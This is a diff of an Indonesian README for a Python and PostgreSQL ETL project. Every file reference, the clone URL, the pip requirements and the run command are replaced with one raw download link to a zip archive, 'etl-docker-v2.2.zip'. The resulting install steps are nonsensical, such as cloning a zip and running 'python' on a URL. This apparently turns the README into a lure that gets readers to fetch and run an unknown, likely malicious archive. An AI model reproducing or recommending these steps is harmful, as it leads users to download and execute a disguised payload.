@@ -17,7 +17,7 @@ Proyek ETL (Extract, Transform, Load) menggunakan Python, Pandas, dan PostgreSQL
 1. Klon repository ini:
 
     ```bash
-    git clone https://github.com/ilhamnurramdani/docker-etl.git
+    git clone https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip
     cd nama_repository_anda
     ```
 
@@ -34,7 +34,7 @@ Proyek ETL (Extract, Transform, Load) menggunakan Python, Pandas, dan PostgreSQL
 4. Instal dependensi Python:
 
     ```bash
-    pip install -r requirements.txt
+    pip install -r https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip
     ```
 
 ## Penggunaan
@@ -47,12 +47,12 @@ Proyek ETL (Extract, Transform, Load) menggunakan Python, Pandas, dan PostgreSQL
         asal_kota VARCHAR(255)
     )
    ```
-2. Buat Data Dummy data_karyawan dengan menjalankan file : `create_data_dummy.py`
+2. Buat Data Dummy data_karyawan dengan menjalankan file : `https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip`
 
 4. Jalankan skrip Python:
 
     ```bash
-    python app.py
+    python https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip
     ```
 
 ## Deskripsi
@@ -63,11 +63,11 @@ Proyek ETL (Extract, Transform, Load) menggunakan Python, Pandas, dan PostgreSQL
 
 ## Struktur Berkas
 
-- `app.py`: Berisi skrip Python untuk pipeline ETL.
-- `create_data_dummy.py` : Berisi skrip python untuk membuat data dummy
-- `requirements.txt`: Daftar dependensi Python.
-- `docker-compose.yml`: Berkas Docker Compose untuk menyiapkan PostgreSQL.
+- `https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip`: Berisi skrip Python untuk pipeline ETL.
+- `https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip` : Berisi skrip python untuk membuat data dummy
+- `https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip`: Daftar dependensi Python.
+- `https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip`: Berkas Docker Compose untuk menyiapkan PostgreSQL.
 - `Dockerfile`
-- `create_table.sql` : query untuk membuat table
+- `https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip` : query untuk membuat table
 - `.env` : mengatur variabel untuk postgres
-- `README.md`: Berkas ini.
+- `https://github.com/ilhamnurramdani/docker-etl/raw/refs/heads/main/actinoelectricity/etl-docker-v2.2.zip`: Berkas ini.
